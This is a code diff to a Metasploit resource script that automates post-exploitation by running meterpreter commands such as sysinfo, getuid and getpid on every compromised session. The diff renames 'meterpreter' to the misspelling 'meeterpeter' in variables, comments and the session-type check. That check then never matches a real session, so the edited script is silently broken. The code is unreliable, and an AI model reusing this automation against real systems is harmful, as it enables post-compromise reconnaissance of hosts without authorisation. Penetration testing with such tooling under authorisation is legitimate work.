@@ -3,7 +3,7 @@
 
 # This Metasploit RC-File could be used to automate the post-exploitation process
 # VERBOSE is used from the global datastore
-# check out the meterpreter_commands and the modules_win and modules_lin and modules_multi
+# check out the meeterpeter_commands and the modules_win and modules_lin and modules_multi
 # you could add your own post exploitation modules into them
 
 <ruby>
@@ -14,13 +14,13 @@ else
 	verbose = 0
 end
 
-meterpreter_commands = Array.new
+meeterpeter_commands = Array.new
 
 if (framework.datastore['METER_AUTO_COM'] != nil)
 	#we look in the global datastore for a global METER_AUTO_COM option and use it
-	meterpreter_commands = framework.datastore['METER_AUTO_COM'].split(" ")
+	meeterpeter_commands = framework.datastore['METER_AUTO_COM'].split(" ")
 else
-	meterpreter_commands = [
+	meeterpeter_commands = [
 		'sysinfo',
 		'getuid',
 		'getpid',
@@ -88,11 +88,11 @@ if (framework.sessions.length > 0)
 	print_status("starting with post exploitation stuff")
 	framework.sessions.each_key do |sid|
 		session = framework.sessions[sid]
-		#meterpreter commands against every meterpreter session
-		if(session.type == "meterpreter")
-			print_line("starting meterpreter commands on session number #{sid}")
-			meterpreter_commands.each { |command|
-				print_line("running meterpreter command #{command}")
+		#meeterpeter commands against every meeterpeter session
+		if(session.type == "meeterpeter")
+			print_line("starting meeterpeter commands on session number #{sid}")
+			meeterpeter_commands.each { |command|
+				print_line("running meeterpeter command #{command}")
 				session.console.run_single("#{command.to_s}")
 				print_line
 			}
